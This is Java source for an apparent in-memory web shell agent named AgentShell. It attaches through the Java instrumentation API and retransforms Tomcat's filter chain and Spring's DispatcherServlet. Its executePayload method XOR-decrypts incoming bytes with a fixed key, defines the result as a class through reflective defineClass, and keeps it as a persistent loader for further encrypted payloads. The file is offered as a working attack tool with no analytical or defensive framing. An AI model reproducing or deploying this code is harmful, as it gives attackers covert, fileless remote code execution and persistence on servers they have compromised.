import java.lang.instrument.Instrumentation;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;
import java.io.*;
import java.lang.reflect.Method;

public class AgentShell implements ClassFileTransformer {

    private static Object globalLoader = null;
    private static final String GLOBAL_KEY = "[KEY]           ";

    public static void premain(String agentArgs, Instrumentation inst) {
        init(inst);
    }

    public static void agentmain(String agentArgs, Instrumentation inst) {
        init(inst);
    }

    private static void init(Instrumentation inst) {
        try {
            inst.addTransformer(new AgentShell(), true);
            Class<?>[] classes = inst.getAllLoadedClasses();
            for (Class<?> c : classes) {
                if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain") ||
                    c.getName().equals("org.springframework.web.servlet.DispatcherServlet")) {
                    try {
                        inst.retransformClasses(c);
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        return null;
    }

    public static String executePayload(byte[] encryptedData, ClassLoader parentLoader) {
        try {
            byte[] decrypted = new byte[encryptedData.length];
            byte[] keyBytes = GLOBAL_KEY.getBytes();
            int keyLength = keyBytes.length;
            for (int i = 0; i < encryptedData.length; i++) {
                decrypted[i] = (byte) (encryptedData[i] ^ keyBytes[(i + 1) % keyLength]);
            }

            boolean isInit = (decrypted.length > 4 && decrypted[0] == (byte)0xCA && decrypted[1] == (byte)0xFE && decrypted[2] == (byte)0xBA && decrypted[3] == (byte)0xBE);

            if (isInit) {
                if (globalLoader != null) {
                    return "LOADER_ALREADY_EXISTS";
                } else {
                    Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineMethod.setAccessible(true);
                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, decrypted, 0, decrypted.length);
                    globalLoader = clazz.getDeclaredConstructor(ClassLoader.class).newInstance(parentLoader);
                    return "LOADER_INIT_SUCCESS";
                }
            } else {
                if (globalLoader != null) {
                    globalLoader.getClass().getMethod("equals", Object.class).invoke(globalLoader, (Object) null);
                    return "EXEC_SUCCESS";
                } else {
                    return "EXEC_FAILED: No loader initialized.";
                }
            }
        } catch (Exception e) {
            return "EXEC_FAILED: " + e.toString();
        }
    }
}